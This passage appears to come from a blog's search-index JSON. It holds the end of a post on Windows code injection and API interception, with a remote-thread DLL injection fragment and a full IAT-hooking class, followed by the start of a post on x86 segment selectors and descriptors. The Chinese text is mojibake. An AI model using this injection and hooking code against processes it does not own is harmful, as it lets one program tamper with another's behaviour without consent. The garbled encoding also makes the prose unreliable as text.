0;\n\tGetExitCodeThread(hRtThread, &amp;dwExitCode);\n\t&#x2F;&#x2F; 6.1 é€€å‡ºç ä¹Ÿå°±æ˜¯LoadLibraryçš„è¿”å›å€¼ï¼ˆå¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œå°±æ˜¯dllçš„æ¨¡å—å¥æŸ„ï¼‰\n\tHMODULE hModule &#x3D; (HMODULE)dwExitCode;\n\n\t&#x2F;&#x2F; 7.é‡Šæ”¾ç©ºé—´\n\tif (!VirtualFreeEx(hProcess, lpAddr, dwSize, MEM_DECOMMIT))\n\t\treturn -1;\n\tCloseHandle(hProcess);\n\n\treturn 0;\n&#125;\n\nDWORD GetPid(const wchar_t* szExeName)\n&#123;\n\t&#x2F;&#x2F; åˆ›å»ºè¿›ç¨‹å¿«ç…§\n\tHANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\t&#x2F;&#x2F; åˆ¤æ–­å¿«ç…§å¥æŸ„æ˜¯å¦æœ‰æ•ˆ\n\tif (hSnapshot !&#x3D; INVALID_HANDLE_VALUE)\n\t&#123;\n\t\t&#x2F;&#x2F;å®šä¹‰è¿›ç¨‹ç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ å¿…é¡»èµ‹å€¼ä¸ºç»“æ„ä½“å¤§å°\n\t\tPROCESSENTRY32 stcPe32 &#x3D; &#123; sizeof(PROCESSENTRY32) &#125;;\n\t\t&#x2F;&#x2F;æŸ¥æ‰¾ç¬¬ä¸€ä¸ªè¿›ç¨‹\n\t\tProcess32First(hSnapshot, &amp;stcPe32);\n\t\tdo\n\t\t&#123;\t&#x2F;&#x2F; å¦‚æœè¿›ç¨‹åä¸€è‡´ï¼Œè¿”å›è¿›ç¨‹id\n\t\t\tif (!wcscmp(stcPe32.szExeFile, szExeName))\n\t\t\t\treturn stcPe32.th32ProcessID;\n\n\t\t\t&#x2F;&#x2F;æŸ¥æ‰¾ä¸‹ä¸€ä¸ªè¿›ç¨‹\n\t\t&#125; while (Process32Next(hSnapshot, &amp;stcPe32));\n\t\t&#x2F;&#x2F;å…³é—­å¿«ç…§å¥æŸ„\n\t\tCloseHandle(hSnapshot);\n\t&#125;\n\treturn -1;\n&#125;\n\nCAPIHookå‡½æ•°å°è£…#ifndef __APIHOOK_H__\n#define __APIHOOK_H__\n#include &lt;windows.h&gt;\nclass CAPIHook \n\n&#123;\n\npublic:\n       CAPIHook(LPSTR  pszModName, LPSTR pszFuncName,\n        PROC pfnHook, BOOL bExcludeAPIHookMod&#x3D;TRUE);\n       virtual ~CAPIHook();\n       operator PROC() &#123;return m_pfnOrig;&#125;\nprivate:\n\n       LPSTR m_pszModName;        &#x2F;&#x2F;å¯¼å‡ºè¦HOOKå‡½æ•°çš„æ¨¡å—çš„åå­—\n       LPSTR m_pszFuncName;  &#x2F;&#x2F;è¦HOOKçš„å‡½æ•°çš„åå­—\n       PROC m_pfnOrig;                  &#x2F;&#x2F;åŸAPIå‡½æ•°åœ°å€\n       PROC m_pfnHook;                &#x2F;&#x2F;HOOKåå‡½æ•°çš„åœ°å€\n       BOOL m_bExcludeAPIHookMod; &#x2F;&#x2F;æ˜¯å¦å°†HOOK APIçš„æ¨¡å—æœ¬èº«æ’é™¤åœ¨å¤–\nprivate:\n       static void ReplaceIATEntryInAllMods(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, BOOL bExcludeAPIHookMod);\n       static void ReplaceIATEntryInOneMod(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, HMODULE hModCaller);\n\n       &#x2F;&#x2F;ä¸‹é¢çš„ä»£ç ç”¨æ¥è§£å†³å…¶ä»–æ¨¡å—åŠ¨æ€åŠ è½½DLLçš„é—®é¢˜\nprivate:\n\n       &#x2F;&#x2F;è¿™ä¸¤ä¸ªæŒ‡é’ˆç”¨æ¥å°†æ‰€æœ‰çš„CAPIHookå¯¹è±¡è¿åœ¨ä¸€èµ·\n       static CAPIHook *sm_pHeader;\n       CAPIHook *m_pNext;\n\nprivate:\n\n       &#x2F;&#x2F;å½“ä¸€ä¸ªæ–°çš„DLLè¢«åŠ è½½æ—¶ï¼Œè°ƒç”¨æ­¤å‡½æ•°\n       static void WINAPI HookNewlyLoadedModule(HMODULE hModule, DWORD dwFlags);\n       &#x2F;&#x2F;ç”¨æ¥è·Ÿè¸ªå½“å‰è¿›ç¨‹åŠ è½½æ–°çš„DLL\n       static HMODULE WINAPI LoadLibraryA(PCSTR pszModulePath);\n       static HMODULE WINAPI LoadLibraryW(PCWSTR pszModulePath);\n       static HMODULE WINAPI LoadLibraryExA(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags);\n       static HMODULE WINAPI LoadLibraryExW(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags);\n       &#x2F;&#x2F;å¦‚æœè¯·æ±‚å·²HOOKçš„APIå‡½æ•°ï¼Œåˆ™è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„åœ°å€\n       static FARPROC WINAPI GetProcAddress(HMODULE hModule, PCSTR pszProcName); \n\nprivate:\n       &#x2F;&#x2F;è‡ªåŠ¨å¯¹è¿™äº›å‡½æ•°è¿›è¡ŒæŒ‚é’©\n       static CAPIHook sm_LoadLibraryA;\n       static CAPIHook sm_LoadLibraryW;\n       static CAPIHook sm_LoadLibraryExA;\n       static CAPIHook sm_LoadLibraryExW;\n       static CAPIHook sm_GetProcAddress;\n&#125;;\n\n#endif\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;APIHook.cpp&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\n#include &quot;APIHook.h&quot;\n#include &quot;Tlhelp32.h&quot;\n#include &lt;ImageHlp.h&gt;  &#x2F;&#x2F;ä¸ºäº†è°ƒç”¨ImageDirectoryEntryToDataå‡½æ•°\n#pragma comment(lib, &quot;ImageHlp&quot;)\n\n&#x2F;&#x2F;CAPIHookå¯¹è±¡é“¾è¡¨çš„å¤´æŒ‡é’ˆ\nCAPIHook *CAPIHook::sm_pHeader &#x3D; NULL;\nCAPIHook::CAPIHook(LPSTR pszModName, LPSTR pszFuncName,PROC pfnHook, BOOL bExcludeAPIHookMod&#x2F;* &#x3D;TRUE *&#x2F;)\n&#123;\n       &#x2F;&#x2F;ä¿å­˜è¿™ä¸ªHookå‡½æ•°çš„ä¿¡æ¯\n       m_bExcludeAPIHookMod &#x3D; bExcludeAPIHookMod;\n       m_pszModName &#x3D; pszModName;\n       m_pszFuncName &#x3D; pszFuncName;\n       m_pfnHook &#x3D; pfnHook;\n       m_pfnOrig &#x3D; ::GetProcAddress(::GetModuleHandle(pszModName), pszFuncName);\n\n       &#x2F;&#x2F;å°†æ­¤å¯¹è±¡æ·»åŠ åˆ°é“¾è¡¨ä¸­\n       m_pNext &#x3D; sm_pHeader;\n       sm_pHeader &#x3D; this;\n       &#x2F;&#x2F;åœ¨æ‰€æœ‰å½“å‰å·²åŠ è½½çš„æ¨¡å—ä¸­HOOKè¿™ä¸ªå‡½æ•°\n       ReplaceIATEntryInAllMods(m_pszModName, m_pfnOrig, m_pfnHook, bExcludeAPIHookMod);\n&#125; \n\nCAPIHook::~CAPIHook()\n&#123;\n       &#x2F;&#x2F;å–æ¶ˆå¯¹æ‰€æœ‰æ¨¡å—ä¸­å‡½æ•°çš„HOOK\n       ReplaceIATEntryInAllMods(m_pszModName, m_pfnHook, m_pfnOrig,  m_bExcludeAPIHookMod);\n       CAPIHook *p &#x3D; sm_pHeader;\n\n       &#x2F;&#x2F;ä»é“¾è¡¨ä¸­ç§»é™¤æ­¤å¯¹è±¡\n       if(p &#x3D;&#x3D; this)\n       &#123;\n              sm_pHeader &#x3D; p-&gt;m_pNext;\n       &#125;\n       else\n       &#123;\n              while(p !&#x3D; NULL)\n              &#123;\n                     if(p-&gt;m_pNext &#x3D;&#x3D; this)\n                     &#123;\n                            p-&gt;m_pNext &#x3D; this-&gt;m_pNext;\n                            break;\n                     &#125;\n                     p &#x3D; p-&gt;m_pNext;\n              &#125;\n       &#125;     \n&#125; \n\nvoid CAPIHook::ReplaceIATEntryInOneMod(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, HMODULE hModCaller)\n&#123;\n       &#x2F;&#x2F;å–å¾—æ¨¡å—çš„å¯¼å…¥è¡¨(import descriptor)çš„é¦–åœ°å€\n       &#x2F;&#x2F;ImageDirectoryEntryToDataå‡½æ•°å¯ä»¥è¿”å›å¯¼å…¥è¡¨åœ°å€\n       ULONG ulSize;\n       PIMAGE_IMPORT_DESCRIPTOR pImportDesc &#x3D;(PIMAGE_IMPORT_DESCRIPTOR)::ImageDirectoryEntryToData(hModCaller, TRUE,IMAGE_DIRECTORY_ENTRY_IMPORT, &amp;ulSize);\n\n       if(pImportDesc &#x3D;&#x3D; NULL)      &#x2F;&#x2F;è¿™ä¸ªæ¨¡å—æ²¡æœ‰å¯¼å…¥è¡¨é¡¹\n              return;  \n\n       &#x2F;&#x2F;æŸ¥æ‰¾åŒ…å«pszExportModæ¨¡å—ä¸­å‡½æ•°å¯¼å…¥ä¿¡æ¯çš„å¯¼å…¥è¡¨é¡¹\n       while(pImportDesc-&gt;Name !&#x3D; 0)\n       &#123;\n              LPSTR pszMod &#x3D; (LPSTR)((DWORD)hModCaller + pImportDesc-&gt;Name);\n              if (lstrcmpi(pszMod, pszExportMod) &#x3D;&#x3D; 0)    \n              &#123;\n                     break;\n              &#125;\n              pImportDesc++;\n       &#125;\n       if (pImportDesc-&gt;Name &#x3D;&#x3D; 0)    &#x2F;&#x2F;hModCalleræ¨¡å—æ²¡æœ‰ä»pszExportModæ¨¡å—å¯¼å…¥ä»»ä½•å‡½æ•°\n       &#123;\n              return;\n       &#125;\n\n       &#x2F;&#x2F;å–å¾—è°ƒç”¨è€…çš„å¯¼å…¥åœ°å€è¡¨(import address table, IAT)\n       PIMAGE_THUNK_DATA pThunk &#x3D; (PIMAGE_THUNK_DATA)(pImportDesc-&gt;FirstThunk +  (DWORD)hModCaller);\n\n       &#x2F;&#x2F;æŸ¥æ‰¾æˆ‘ä»¬è¦HOOKçš„å‡½æ•°ï¼Œå°†å®ƒçš„åœ°å€ç”¨æ–°å‡½æ•°çš„åœ°å€æ›¿æ¢æ‰\n       while (pThunk-&gt;u1.Function)\n       &#123;\n              &#x2F;&#x2F;lpAddræŒ‡å‘çš„å†…å­˜ä¿å­˜äº†å‡½æ•°çš„åœ°å€\n              PDWORD lpAddr &#x3D; (PDWORD)&amp;(pThunk-&gt;u1.Function);\n              if (*lpAddr &#x3D;&#x3D; (DWORD)pfnCurrent)\n              &#123;\n                     &#x2F;&#x2F;ä¿®æ”¹é¡µçš„ä¿æŠ¤å±æ€§\n                     DWORD dwOldProtect;\n                     MEMORY_BASIC_INFORMATION mbi;\n                     ::VirtualQuery(lpAddr, &amp;mbi, sizeof(mbi));\n                     ::VirtualProtect(lpAddr, sizeof(DWORD), PAGE_READWRITE, &amp;dwOldProtect);\n \n\n                     &#x2F;&#x2F;ä¿®æ”¹å†…å­˜åœ°å€ï¼Œç›¸å½“äº&quot;lpAddr &#x3D; (DWORD)pfnNew;&quot;\n                     ::WriteProcessMemory(::GetCurrentProcess(), lpAddr,  &amp;pfnNew, sizeof(DWORD), NULL);\n                     ::VirtualProtect(lpAddr, sizeof(DWORD), dwOldProtect, 0);\n                     break;\n              &#125;\n              pThunk++;\n       &#125;\n&#125;\n\n \n\nvoid CAPIHook::ReplaceIATEntryInAllMods(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, BOOL bExcludeAPIHookMod)\n&#123;\n       &#x2F;&#x2F;å–å¾—å½“å‰æ¨¡å—çš„å¥æŸ„\n       HMODULE hModThis &#x3D; NULL;\n       if(bExcludeAPIHookMod)\n       &#123;\n              MEMORY_BASIC_INFORMATION mbi;\n              if(::VirtualQuery(ReplaceIATEntryInAllMods, &amp;mbi, sizeof(mbi)) !&#x3D; 0)\n                     hModThis &#x3D; (HMODULE)mbi.AllocationBase;\n       &#125;\n\n       &#x2F;&#x2F;å–å¾—æœ¬è¿›ç¨‹çš„æ¨¡å—åˆ—è¡¨\n       HANDLE hSnap &#x3D; ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ::GetCurrentProcessId());\n \n\n       &#x2F;&#x2F;éå†æ‰€æœ‰æ¨¡å—ï¼Œåˆ†åˆ«å¯¹å®ƒä»¬è°ƒç”¨ReplaceIATEntryInOnModå‡½æ•°ï¼Œä¿®æ”¹å¯¼å…¥åœ°å€è¡¨\n       MODULEENTRY32 me &#x3D; &#123;sizeof(MODULEENTRY32)&#125;;\n       BOOL bOK &#x3D; ::Module32First(hSnap, &amp;me);\n       while (bOK)\n       &#123;\n              &#x2F;&#x2F;æ³¨æ„ï¼Œæˆ‘ä»¬ä¸HOOKå½“å‰æ¨¡å—çš„å‡½æ•°\n              if (me.hModule !&#x3D; hModThis)\n              &#123;\n                    ReplaceIATEntryInOneMod(pszExportMod, pfnCurrent, pfnNew, me.hModule);\n              &#125;\n\n              bOK &#x3D; ::Module32Next(hSnap, &amp;me);\n       &#125;\n       ::CloseHandle(hSnap);\n&#125;\n\n \n\n&#x2F;&#x2F;æŒ‚é’©LoadLibraryå’ŒGetProcAddresså‡½æ•°ï¼Œä»¥ä¾¿åœ¨è¿™äº›å‡½æ•°è¢«è°ƒç”¨ä»¥åï¼ŒæŒ‚é’©çš„å‡½æ•°ä¹Ÿèƒ½å¤Ÿè¢«æ­£ç¡®çš„å¤„ç†\nCAPIHook CAPIHook::sm_LoadLibraryA(&quot;Kernel32.dll&quot;, &quot;LoadLibraryA&quot;, (PROC)CAPIHook::LoadLibraryA, TRUE);\nCAPIHook CAPIHook::sm_LoadLibraryW(&quot;Kernel32.dll&quot;, &quot;LoadLibraryW&quot;, (PROC)CAPIHook::LoadLibraryW, TRUE);\nCAPIHook CAPIHook::sm_LoadLibraryExA(&quot;Kernel32.dll&quot;, &quot;LoadLibraryExA&quot;,(PROC)CAPIHook::LoadLibraryExA, TRUE);\nCAPIHook CAPIHook::sm_LoadLibraryExW(&quot;Kernel32.dll&quot;, &quot;LoadLibraryExW&quot;,(PROC)CAPIHook::LoadLibraryExW, TRUE);\nCAPIHook CAPIHook::sm_GetProcAddress(&quot;Kernel32.dll&quot;, &quot;GetProcAddress&quot;, (PROC)CAPIHook::GetProcAddress, TRUE);\n\nvoid WINAPI CAPIHook::HookNewlyLoadedModule(HMODULE hModule, DWORD dwFlags)\n&#123;\n       &#x2F;&#x2F;å¦‚æœä¸€ä¸ªæ–°çš„æ¨¡å—è¢«åŠ è½½ï¼ŒæŒ‚é’©å„CAPIHookå¯¹è±¡è¦æ±‚çš„APIå‡½æ•°\n       if((hModule !&#x3D; NULL) &amp;&amp; ((dwFlags&amp;LOAD_LIBRARY_AS_DATAFILE) &#x3D;&#x3D; 0))\n       &#123;\n              CAPIHook *p &#x3D; sm_pHeader;\n              while (p !&#x3D; NULL)\n              &#123;\n                     ReplaceIATEntryInOneMod(p-&gt;m_pszModName, p-&gt;m_pfnOrig, p-&gt;m_pfnHook, hModule);\n                     p &#x3D; p-&gt;m_pNext;\n              &#125;\n       &#125;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryA(PCSTR pszModulePath)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryA(pszModulePath);\n       HookNewlyLoadedModule(hModule, 0);\n       return hModule;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryW(PCWSTR pszModulePath)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryW(pszModulePath);\n       HookNewlyLoadedModule(hModule, 0);\n       return hModule;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryExA(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryExA(pszModulePath, hFile, dwFlags);\n       HookNewlyLoadedModule(hModule, dwFlags);\n       return hModule;\n&#125;\n\n \n\nHMODULE WINAPI CAPIHook::LoadLibraryExW(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags)\n&#123;\n       HMODULE hModule &#x3D; ::LoadLibraryExW(pszModulePath, hFile, dwFlags);\n       HookNewlyLoadedModule(hModule, dwFlags);\n       return hModule;\n&#125;\n\n \n\nFARPROC WINAPI CAPIHook::GetProcAddress(HMODULE hModule, PCSTR pszProcName)\n&#123;\n       &#x2F;&#x2F;å¾—åˆ°å‡½æ•°çš„çœŸå®åœ°å€\n       FARPROC pfn &#x3D; ::GetProcAddress(hModule, pszProcName);\n       &#x2F;&#x2F;çœ‹å®ƒæ˜¯å¦æˆ‘ä»¬è¦HOOKçš„å‡½æ•°\n       CAPIHook *p &#x3D; sm_pHeader;\n       while(p !&#x3D; NULL)\n       &#123;\n              if (p-&gt;m_pfnOrig &#x3D;&#x3D; pfn)\n              &#123;\n                     pfn &#x3D; p-&gt;m_pfnHook;\n                     break;\n              &#125;\n              p &#x3D; p-&gt;m_pNext;\n       &#125;\n       return pfn;\n&#125;\n","slug":"ä»£ç æ³¨å…¥ä¸æ‹¦æˆª","date":"2020-06-21T07:47:31.000Z","categories_index":"Windowså®‰å…¨","tags_index":"Windowsæ³¨å…¥","author_index":"Akpigs"},{"id":"ebb230849b36768b2e4833fd7043c535","title":"å†…æ ¸åŸºç¡€","content":"åˆ†æ®µæœºåˆ¶\nåœ¨ 32 ä½ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ®µå¯„å­˜å™¨å°±ä¸ä¼šå†ç›´æ¥ä¿å­˜æ®µåŸºå€äº†ï¼Œè€Œæ˜¯åˆ†æˆäº†å¯è§çš„ 16 ä½æ®µé€‰æ‹©å­éƒ¨åˆ†å’Œä¸å¯è§çš„ 80 ä½é«˜é€Ÿç¼“å†²éƒ¨åˆ†ï¼Œå¯¹äºè®¿é—®å†…å­˜éœ€è¦ç”¨åˆ°çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚æ®µçš„åŸºå€ã€é™é•¿å’Œè®¿é—®å±æ€§ç­‰éƒ½ä¼šè¢«ä¿å­˜åœ¨è¿™é‡Œçš„ä¸å¯è§éƒ¨åˆ†ã€‚è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹æ— æ³•äººä¸ºçš„ç›´æ¥è¯»å–åˆ°ï¼Œåœ¨æ®µå¯„å­˜å™¨è¿›è¡Œåˆ‡æ¢æ—¶ä¼šè¢« CPU è‡ªåŠ¨åŠ è½½ã€‚é¦–å…ˆï¼Œä¼šè§£æ 16 ä½çš„æ®µé€‰æ‹©å­éƒ¨åˆ†ï¼Œä» TI ä½è·å–åˆ°è¦ä½¿ç”¨çš„æ˜¯å“ªä¸€å¼ è¡¨(GDT?LDT?)ï¼Œç”±äºWindowsæ²¡æœ‰ä½¿ç”¨LDTï¼Œæ‰€ä»¥ç›®å‰ä¿å­˜çš„éƒ½æ˜¯ 0ï¼Œå†ä» INDEX è·å–è¡¨å†…å…ƒç´ çš„ä¸‹æ ‡ï¼Œå†è¿›è¡Œæƒé™æ£€æŸ¥åï¼Œä»ä¸­åŠ è½½æ®µçš„ä¿¡æ¯åˆ°ä¸å¯è§çš„é«˜é€Ÿç¼“å­˜éƒ¨åˆ†ã€‚\nåœ¨16ä½ä¸Šæ˜¯æ®µåŸºå€ï¼Œåœ¨32ä½ä¸Šæ˜¯æ®µé€‰æ‹©å­\n\næ®µé€‰æ‹©å­\nä»ä¸‹é¢çš„ç»“æ„ä½“å®šä¹‰å¯ä»¥çœ‹å‡ºï¼Œæ®µé€‰æ‹©å­ç”± INDEXã€TI ä»¥åŠ RPL ç»„æˆï¼Œå…¶ä¸­ RPL å…¨ç§°ä¸ºè¯·æ±‚æƒé™çº§åˆ«ï¼Œè¡¨ç¤ºå½“å‰ä½¿ç”¨ä»€ä¹ˆæ ·çš„æƒé™å‘å‡ºè¯·æ±‚ï¼ŒTI ä½æŒ‡å®šäº†å½“å‰æŸ¥æ‰¾çš„æ˜¯ GDT(0) è¿˜æ˜¯ LDT(1)ï¼ŒINDEX æ ‡è¯†çš„æ˜¯ç´¢å¼•ï¼Œéœ€è¦å°† index é…åˆ ti ä½ä¸€èµ·ä½¿ç”¨ï¼Œæ‰¾åˆ°æœ€ç»ˆçš„ æ®µæè¿°ç¬¦ã€‚\næ®µé€‰æ‹©å­æ˜¯ä¸€ä¸ª16ä½çš„æ•°å€¼ï¼Œé«˜13ä½ä¸ºå…¨å±€æè¿°è¡¨çš„ç´¢å¼•ï¼Œç¬¬ä¸‰ä½ç´¢å¼•GDTï¼ŒLDTï¼Œä½ä¸¤ä½ä¸ºè¯·æ±‚ç‰¹æƒçº§\n\ntypedef struct _SELECTOR \n&#123;\n    unsigned short index: 13;\t\t\t\t&#x2F;&#x2F; index æ˜¯å­˜åœ¨äº GDT æˆ– LDT ä¸­å…ƒç´ çš„ç´¢å¼•\n\tunsigned short    ti:  1;\t\t\t\t&#x2F;&#x2F; ä¸º 0 è¡¨ç¤º GDT å¦åˆ™æ˜¯ LDTï¼Œwindows å§‹ç»ˆå„ä¸º 0\n    unsigned short   rpl:  2;\t\t\t\t&#x2F;&#x2F; è¯·æ±‚æƒé™çº§åˆ«ï¼Œè¡¨ç¤ºä½¿ç”¨ä»€ä¹ˆæ ·çš„æƒé™è®¿é—®\n&#125;\n\næ®µæè¿°ç¬¦\nGDT æˆ– LDT ä¸­ä¿å­˜çš„å°±æ˜¯æ®µæè¿°ç¬¦ï¼Œæ¯ä¸€ä¸ªæ®µæè¿°ç¬¦éƒ½æè¿°äº†æ®µçš„ä¸€äº›ä¿¡æ¯ï¼Œ32ä½ä¸‹ï¼Œå¤§å°ä¸º 8 å­—èŠ‚(64ä½)\nåœ¨ windbg ä¸­ä½¿ç”¨ gdtr å¯„å­˜å™¨å¯ä»¥è·å–æ®µæè¿°ç¬¦çš„åŸºå€ï¼Œgdtl è·å–æ®µæè¿°ç¬¦çš„é™é•¿ã€‚\né€šè¿‡æ±‡ç¼–æŒ‡ä»¤ rgdt è·å– gdt å¯„å­˜å™¨ï¼Œè¿˜å¯ä»¥é€šè¿‡ lgdt(ç‰¹æƒæŒ‡ä»¤) è®¾ç½® gdt å¯„å­˜å™¨çš„å†…å®¹ã€‚\næè¿°ä¸€ä¸ªæ®µçš„ä½ç½®å’Œå¤§å°ä¿¡æ¯ä»¥åŠè®¿é—®æ§åˆ¶çš„çŠ¶æ€ä¿¡æ¯ï¼Œå­˜åœ¨GDTRå¯„å­˜å™¨æŒ‡å‘çš„å†…å­˜ä¸­\n\ntypedef struct _DESCRIPTOR\n&#123;\n    unsigned int limit1: 16;\t\t\t\t&#x2F;&#x2F; æ®µé™é•¿ [0~15]\n    unsigned int base1:  16;\t\t\t\t&#x2F;&#x2F; æ®µåŸºå€ [0~15]\n    unsigned int base2:   8;\t\t\t\t&#x2F;&#x2F; æ®µåŸºå€ [16~23]\n    unsigned int type:    4;\t\t\t\t&#x2F;&#x2F; æ®µçš„ç±»å‹\n    unsigned int s:\t\t  1;\t\t\t    &#x2F;&#x2F; å½“å‰æ˜¯ç³»ç»Ÿæ®µè¿˜æ˜¯ç”¨æˆ·æ®µ\n    unsigned int dpl:     2;                &#x2F;&#x2F; è®¿é—®å½“å‰æ®µéœ€è¦ç”¨åˆ°çš„æƒé™\n    unsigned int p:       1;                &#x2F;&#x2F; è¡¨ç¤ºå½“å‰çš„æ®µæ˜¯å¦æ˜¯æœ‰æ•ˆçš„\n    unsigned int limit2:  4;                &#x2F;&#x2F; æ®µé™é•¿ [16~19]\n    unsigned int avl:     1;                &#x2F;&#x2F; ä¿ç•™ç»™æ“ä½œç³»ç»Ÿçš„\n    unsigned int L:       1;                &#x2F;&#x2F; æ˜¯å¦æ˜¯é•¿æ¨¡å¼\n    unsigned int db:      1;                &#x2F;&#x2F; é»˜è®¤ä½¿ç”¨çš„å•ä½\n    unsigned int G:       1;                &#x2F;&#x2F; è¡¨ç¤º limit çš„å•ä½\n    unsigned int base3:   8;                &#x2F;&#x2F; æ®µåŸºå€ [24~31]\n&#125;\n\n\n*Base: ç”± 3 ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«å¯¹åº”äº† 32 ä½åŸºå€çš„ 0 ~ 15ã€16 ~ 23 ä»¥åŠ 24 ~ 31 ä½ï¼Œè¡¨ç¤ºæ®µåŸºåœ°å€\n\nP: æ˜¯åˆ‡æ¢å¯„å­˜å™¨æ—¶æ£€æŸ¥çš„ç¬¬ä¸€ä¸ªä½ï¼Œè¡¨ç¤ºå½“å‰çš„æ®µæè¿°ç¬¦æ˜¯å¦æ˜¯æœ‰æ•ˆçš„ï¼Œå¦‚æœæœ‰æ•ˆä¸º 1ï¼Œå¦åˆ™ä¸º 0\n\nAVLï¼šå¯¹äº i386 çš„æ‰€æœ‰å¤„ç†å™¨æ¥è¯´ï¼ŒCPU éƒ½ä¸ä¼šä½¿ç”¨å®ƒï¼Œä¼šå°†å®ƒç•™ç»™ç”¨æˆ·ï¼ˆæ“ä½œï¼‰è¿›è¡Œæ“ä½œ\n\nL: å¦‚æœå½“å‰çš„å¤„ç†å“¦å…¶å¤„äº 64 ä½æ¨¡å¼ï¼Œå°±ä¼šæä¾› L ä½è¿›è¡Œæ ‡è¯†ï¼Œè¡¨ç¤ºå½“å‰ä½¿ç”¨çš„æ˜¯é•¿æ¨¡å¼\n\n*DPLï¼šç›®æ ‡è¯·æ±‚çº§åˆ«ï¼Œæè¿°çš„æ˜¯æƒ³è¦è®¿é—®å½“å‰çš„æ®µæè¿°ç¬¦å¿…é¡»æ‹¥æœ‰çš„æƒé™ï¼Œæƒé™é€šå¸¸è¦å°äºRPL\\CPLï¼ŒDPLæ˜¯ç›®æ ‡ä»£ç æ®µçš„è®¿é—®æƒé™ï¼ŒCPLå½“å‰æ‰§è¡Œæƒé™ï¼ŒRPLä»£ç æ®µæƒé™\n\nLimit å’Œ G ä½ï¼šLimit ç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼Œå…±ä½¿ç”¨äº† 20 ä½çš„æ•°æ®è¡¨ç¤ºæ®µé™é•¿ï¼Œå½“ G ä½ä¸º 0 æ—¶ï¼ŒLimit çš„å•ä½å°±æ˜¯ 1Byteï¼Œå½“ G ä½ä¸º 1 æ—¶ï¼ŒLimit çš„å•ä½å°±æ˜¯ 0x1000(4KB)ï¼Œæ‰€ä»¥Limit çš„å€¼æœ€å¤§å¯èƒ½æ˜¯ä¸‹é¢çš„æƒ…å†µ\n\nè‹¥ G ä¸º 1ï¼šå‡è®¾ Limit ä¸º 0xFFFFFï¼Œæ­¤æ—¶æœ€ç»ˆé™é•¿ä¸º 0xFFFFF Ã— 0x1000 + 0xFFF -&gt; 0xFFFFFFFF\nè‹¥ G ä¸º 0ï¼šå‡è®¾ Limit ä¸º 0xFFFFFï¼Œæ­¤æ—¶æœ€ç»ˆé™é•¿ä¸º 0xFFFFF Ã— 1 -&gt; 0xFFFFF\n\n\nD\\Bï¼šç”¨äºè®¾ç½®é»˜è®¤æ“ä½œæ•°çš„å¤§å°å’Œé»˜è®¤åœ°å€çš„å¤§å°ã€‚å¯¹äºæ ˆæ¥è¯´ï¼Œé€šå¸¸å°†è¿™ä¸€ä½æˆä¸º B ä½ï¼Œå½“ B ä½ä¸º1æ—¶ï¼Œé»˜è®¤å¯¹ ESP çš„æ“ä½œæ˜¯ä»¥ 4 å­—èŠ‚è®¡ç®—çš„ï¼Œä¾‹å¦‚ push 1 å®é™…æ‰§è¡Œäº† sub esp, 4 çš„æ“ä½œã€‚å¯¹äºå…¶å®ƒæƒ…å†µï¼Œè¯¥ä½è¢«ç§°ä½œ D ä½ï¼Œè¡¨ç¤ºé»˜è®¤ä½¿ç”¨çš„æ˜¯ 4 å­—èŠ‚è¿˜æ˜¯ 2 å­—èŠ‚ã€‚é€šè¿‡ OPCODE æŒ‡ä»¤å‰ç¼€å¯ä»¥ä¿®æ”¹æ“ä½œæ•°å’Œåœ°å€å¤§å°ã€‚\nå½“å‰æ˜¯ä»£ç æ®µæ—¶ D &#x3D; 1é‡‡ç”¨32ä½å¯»å€æ–¹å¼,D &#x3D; 0 é‡‡ç”¨16ä½å¯»å€æ–¹å¼\nå½“å‰æ˜¯æ•°æ®æ®µæ˜¯ D &#x3D; 1 æ— è®ºæ˜¯å‘ä¸Šæ‹“å±•è¿˜æ˜¯å‘ä¸‹éƒ½æ˜¯4Gb, D&#x3D;0 å®ƒçš„æ‹“å±•èŒƒå›´åªæœ‰64kb\n\n\n\n\nç”¨æˆ·æ®µ\n\nå½“ S ä½ä¸º 1 æ—¶ï¼Œè¡¨ç¤ºå½“å‰å°±æ˜¯ç”¨æˆ·æ®µï¼Œç”¨æˆ·æ®µåˆå­˜åœ¨äº†ä¸¤ç§çŠ¶æ€ï¼Œåˆ†åˆ«æ˜¯ä»£ç æ®µå’Œæ•°æ®æ®µï¼Œ\nSä½ä¸º0æ—¶ï¼Œæ˜¯ç³»ç»Ÿï¼ŒTYPEä»£è¡¨è¿™ä¸ªæ®µçš„è°ƒç”¨é—¨ï¼Œé™·é˜±é—¨ï¼Œä»»åŠ¡é—¨\n\nå¦‚æœ TYPE 